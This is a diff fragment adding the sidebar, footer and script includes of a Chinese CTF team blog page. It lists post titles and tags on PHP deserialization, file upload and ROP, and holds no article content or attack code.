+        <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/bypass-canary/" style="font-size: 10px;">bypass canary</a> <a href="/tags/mrctf/" style="font-size: 10px;">mrctf</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/pop/" style="font-size: 10px;">pop</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen is-sticky">
+        
+            
+        
+            <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2020/04/03/MRCTF2020/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="MRCTF新生赛 2020">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-04-03T10:35:21.000Z">2020-04-03</time></div>
+                    <a href="/2020/04/03/MRCTF2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MRCTF新生赛 2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/contest/">contest</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="文件上传">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T16:01:00.000Z">2020-03-19</time></div>
+                    <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="title has-link-black-ter is-size-6 has-text-weight-normal">文件上传</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="从反序列化、POP链看PHP代码审计">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T10:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="title has-link-black-ter is-size-6 has-text-weight-normal">从反序列化、POP链看PHP代码审计</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/php-bypass/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="https://live.ieki.xyz/usr/uploads/2020/02/ctf-daily.png" alt="PHP积累">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/php-bypass/" class="title has-link-black-ter is-size-6 has-text-weight-normal">PHP积累</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="从两道题目浅谈PHP深浅拷贝">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/" class="title has-link-black-ter is-size-6 has-text-weight-normal">从两道题目浅谈PHP深浅拷贝</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ROP/">
+                        <span class="tag">ROP</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/bypass-canary/">
+                        <span class="tag">bypass canary</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/mrctf/">
+                        <span class="tag">mrctf</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/php/">
+                        <span class="tag">php</span>
+                        <span class="tag is-grey">3</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pop/">
+                        <span class="tag">pop</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/rce/">
+                        <span class="tag">rce</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right is-sticky">
+    
+        
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2020/04/03/MRCTF2020/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="MRCTF新生赛 2020">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-04-03T10:35:21.000Z">2020-04-03</time></div>
+                    <a href="/2020/04/03/MRCTF2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MRCTF新生赛 2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/contest/">contest</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="文件上传">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T16:01:00.000Z">2020-03-19</time></div>
+                    <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="title has-link-black-ter is-size-6 has-text-weight-normal">文件上传</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="从反序列化、POP链看PHP代码审计">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T10:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="title has-link-black-ter is-size-6 has-text-weight-normal">从反序列化、POP链看PHP代码审计</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/php-bypass/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="https://live.ieki.xyz/usr/uploads/2020/02/ctf-daily.png" alt="PHP积累">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/php-bypass/" class="title has-link-black-ter is-size-6 has-text-weight-normal">PHP积累</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="从两道题目浅谈PHP深浅拷贝">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/" class="title has-link-black-ter is-size-6 has-text-weight-normal">从两道题目浅谈PHP深浅拷贝</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ROP/">
+                        <span class="tag">ROP</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/bypass-canary/">
+                        <span class="tag">bypass canary</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/mrctf/">
+                        <span class="tag">mrctf</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/php/">
+                        <span class="tag">php</span>
+                        <span class="tag is-grey">3</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pop/">
+                        <span class="tag">pop</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/rce/">
+                        <span class="tag">rce</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.png" alt="Merak" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 Merak&nbsp;
+				<a href="http://beian.miit.gov.cn/">吉ICP备20000355号-2</a>
+				&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'https://we.buptmerak.cn',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
